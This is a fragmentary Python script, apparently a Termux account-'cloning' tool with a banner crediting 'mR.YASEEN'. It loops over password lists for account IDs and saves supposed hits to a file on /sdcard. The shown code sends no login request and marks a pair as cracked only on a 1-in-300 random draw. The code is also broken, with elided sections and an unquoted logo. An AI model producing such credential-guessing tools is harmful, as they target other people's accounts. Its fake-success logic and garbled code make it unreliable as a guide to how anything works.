...
def linex():
    print('\033[1;97m====================================================')
logo=
db    db  .d8b.  .d8888. d88888b d88888b d8b   db 
...
\x1b[1;97m ---------------------------------------------
\x1b[1;97m [\x1b[1;91m•\x1b[1;97m] \x1b[1;97m Owner   :  mR.YASEEN
\x1b[1;97m [\x1b[1;91m•\x1b[1;97m] \x1b[1;97m Facebook:  YASEEN
\x1b[1;97m [\x1b[1;91m•\x1b[1;97m] \x1b[1;97m Status  :  FREE
\x1b[1;97m [\x1b[1;91m•\x1b[1;97m] \x1b[1;97m Tool    :  MIX
\x1b[1;97m [\x1b[1;91m•\x1b[1;97m] \x1b[1;97m Version : \x1b[1;92m1.0
\x1b[1;97m ----------------------------------------------
\x1b[1;97m 
\033[1;37m==================================================== """  )
def linex():
...
def method():
    ...
    def start(user):
     try:
        ...
        sys.stdout.write(f'\r [{W}ITX.YASEEN] {W}{loop}{W}|{W}{len(oku)}\r')
        sys.stdout.flush()
        loop+=1
        for pswd in pp:
              heads=None
              ...
              if 6==random.randint(1,300):
                 oku.append(acc)
                 print('\033[1;32m[ITX.YASEEN-OK] \033[1;32m'+acc+' \033[1;32m|\033[1;32m '+pswd)
                 open('/sdcard/ITX.YASEEN-Ok.txt','a').write(f'{acc}|{pswd}\n')
                 break
              else:
                   continue   
